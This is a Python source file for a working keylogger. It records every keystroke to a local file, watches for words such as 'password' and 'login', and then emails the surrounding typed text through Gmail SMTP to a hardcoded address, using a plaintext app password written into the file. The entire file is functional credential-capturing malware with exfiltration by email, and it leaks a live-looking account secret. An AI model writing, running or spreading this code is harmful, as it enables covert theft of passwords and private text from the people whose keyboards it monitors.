import smtplib
import ssl
import os
from pynput import keyboard
from pygame import mixer
from datetime import datetime
from email.message import EmailMessage  # Moved to the top

# --- CONFIGURATION ---
LOG_FILE = "key_log.txt"
TRIGGER_WORDS = ["password", "login", "1234"]

# Email Settings
SENDER_EMAIL = "sizorqueen9903@gmail.com"
RECEIVER_EMAIL = "sizorqueen9903@gmail.com"
APP_PASSWORD = "oxugwnwznqjlhzjh"  # REMINDER: Generate a NEW one and remove spaces
SMTP_SERVER = "smtp.gmail.com"
PORT = 465 

typed_sequence = ""

def send_email_notification(word, context):
    """Sends a UTF-8 encoded email alert using the modern EmailMessage class."""
    msg = EmailMessage()
    msg.set_content(f"Trigger detected at: {datetime.now()}\nWord: {word}\n\nRecent context:\n{context}")
    
    msg['Subject'] = f"⚠️ Alert: Trigger Word '{word}' Detected"
    msg['From'] = SENDER_EMAIL
    msg['To'] = RECEIVER_EMAIL

    context_ssl = ssl.create_default_context()
    try:
        with smtplib.SMTP_SSL(SMTP_SERVER, PORT, context=context_ssl) as server:
            server.login(SENDER_EMAIL, APP_PASSWORD)
            server.send_message(msg) 
        print("Email notification sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# Initialize the mixer once (put this outside your functions)
mixer.init()

def trigger_action(trigger_word, full_context):
    print(f"Trigger word detected: {trigger_word}")
    
    # 1. Reliable Sound Playback
    try:
        # Load and play every time without locking the file
        sound = mixer.Sound("beep.wav")
        sound.play()
    except Exception as e:
        print(f"Sound error: {e}")
    
    # 2. Email Alert
    send_email_notification(trigger_word, full_context)
def on_press(key):
    global typed_sequence
    char = ""
    try:
        # Get the character
        if key.char is not None:
            char = key.char
            typed_sequence += char
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            char = " "
            typed_sequence += " "
        elif key == keyboard.Key.enter:
            char = "\n"
            typed_sequence += " " 
        else:
            char = f" [{key}] "
    
    # Log to file
    if char:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(char)

    # Check triggers
    for word in TRIGGER_WORDS:
        if word in typed_sequence.lower():
            trigger_action(word, typed_sequence[-100:])
            typed_sequence = ""

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting...")
        return False

print("Logger active... Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()